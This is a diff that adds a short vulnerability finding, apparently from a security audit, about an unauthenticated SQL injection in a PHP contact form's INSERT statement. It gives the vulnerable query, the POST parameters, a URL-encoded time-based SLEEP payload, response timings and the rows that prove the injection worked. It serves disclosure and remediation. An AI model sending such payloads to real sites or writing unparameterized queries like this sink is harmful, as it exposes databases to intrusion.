@@ -1,0 +1,17 @@
+HMS-06: Unauthenticated INSERT SQLi in public contact form
+Sink: contact.php:10  "insert into contact(name,email,contact,message) values('$name','$email','$contact','$message');"
+Entry: POST /contact.php (btnSubmit=1, txtName, txtEmail, txtPhone, txtMsg)
+Payload rewrites VALUES: 4th column becomes (SELECT SLEEP(5)), tail commented out.
+
+    baseline: POST /contact.php  btnSubmit=1&txtName=Night&txtEmail=night@test.local&txtPhone=1234567890&txtMsg=hello
+              -> HTTP 200 in 0.031s
+    payload:  POST /contact.php  ...&txtPhone=x%27%2C%28SELECT%20SLEEP%285%29%29%29--%20-&txtMsg=hello
+              (decodes to txtPhone = x',(SELECT SLEEP(5)))-- - )
+              -> HTTP 200 in 5.044s
+
+    Stored-row proof (values(...) rewritten to exactly 4 columns):
+      SELECT * FROM contact WHERE email='night@test.local':
+        Night | night@test.local | 1234567890 | hello    <- baseline
+        Night | night@test.local | x          | 0        <- payload: contact='x',
+                                                            message=(SELECT SLEEP(5))=0
+    Delay + stored SLEEP() return value => expression evaluated by MySQL.
